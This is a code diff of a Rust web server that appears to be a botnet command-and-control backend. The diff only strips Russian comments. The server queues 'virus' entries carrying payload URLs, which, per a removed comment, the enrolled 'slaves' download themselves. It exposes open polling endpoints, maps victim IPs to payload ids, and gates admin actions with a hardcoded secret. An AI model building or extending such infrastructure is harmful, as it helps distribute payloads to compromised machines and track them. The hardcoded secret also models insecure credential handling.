@@ -8,8 +8,6 @@ use serde::{Deserialize, Serialize};
 use std::{collections::HashMap, sync::Arc};
 use tokio::sync::Mutex;
 
-/// TODO: регистрация diddy
-
 #[derive(Clone, Serialize, Deserialize)]
 struct Virus {
     id: u64,
@@ -68,14 +66,12 @@ async fn main() {
 }
 
 async fn poll_handler(State(state): State<Arc<BotnetState>>) -> Json<BotnetStateSnapshot> {
-    // /poll отдаёт весь снапшот: и que, и pro — открытая ручка для слейвов и web ui
     Json(BotnetStateSnapshot {
         que: state.que.lock().await.clone(),
         pro: state.pro.lock().await.clone(),
     })
 }
 
-// снапшот состояния: и очередь и pro
 #[derive(Serialize)]
 struct BotnetStateSnapshot {
     que: Vec<Virus>,
@@ -83,7 +79,6 @@ struct BotnetStateSnapshot {
 }
 
 async fn pro_handler(State(state): State<Arc<BotnetState>>) -> Json<HashMap<String, u64>> {
-    // ip -> id вируса — открытая ручка для слейвов
     Json(state.pro.lock().await.clone())
 }
 
@@ -98,14 +93,12 @@ async fn virus_add_handler(
     Json(body): Json<NewVirus>,
 ) -> Result<Json<Virus>, StatusCode> {
     match body.secret.as_str() {
-        // id = id последнего + 1, статус "created", out = None
-        // payload не храним — только url, качает сам slave
         "gazan67" => Ok(Json(add_virus(&state, &body.url).await)),
         _ => Err(StatusCode::UNAUTHORIZED),
     }
 }
 
-// принять важные вычисления (открытая ручка — сюда стучатся слейвы)
+// принять важные вычисления 
 #[derive(Deserialize)]
 struct VirusResult {
     id: u64,
@@ -120,7 +113,6 @@ async fn virus_status_handler(
     let mut que = state.que.lock().await;
     match body.status.as_str() {
         "cooked" => set_virus_result(&mut que, &body),
-        // клиент по out отправил свой ip — кладём пару ip -> id вируса в pro
         "accepted" => {
             let mut pro = state.pro.lock().await;
 
@@ -128,7 +120,7 @@ async fn virus_status_handler(
                 Ok(index) => {
                     if que[index].status == "created" {
                         que[index].status = "accepted".to_owned();
-                        pro.insert(body.out.clone(), body.id); // pro: ip клиента -> id вируса
+                        pro.insert(body.out.clone(), body.id); 
                         format!("virus {} accepted", body.id)
                     } else {
                         format!("virus {} already taken", body.id)
@@ -152,7 +144,6 @@ async fn virus_remove_handler(
     Json(body): Json<RemoveVirus>,
 ) -> Result<String, StatusCode> {
     match body.secret.as_str() {
-        // удалить вирус по id из очереди
         "gazan67" => {
             let mut que = state.que.lock().await;
             match que.iter().position(|virus| virus.id == body.id) {
@@ -179,7 +170,6 @@ fn set_virus_result(que: &mut Vec<Virus>, body: &VirusResult) -> String {
     }
 }
 
-// управление pro: удалить дидди из pro по ip
 #[derive(Deserialize)]
 struct DiddyRemove {
     ip: String,
@@ -202,7 +192,6 @@ async fn diddy_remove_handler(
     }
 }
 
-// управление pro: переназначить дидди на другой вирус
 #[derive(Deserialize)]
 struct DiddyAssign {
     ip: String,
@@ -224,7 +213,6 @@ async fn diddy_assign_handler(
     }
 }
 
-// вычистить всю очередь разом (кнопка «снести всё» для web ui)
 #[derive(Deserialize)]
 struct SecretOnly {
     secret: String,
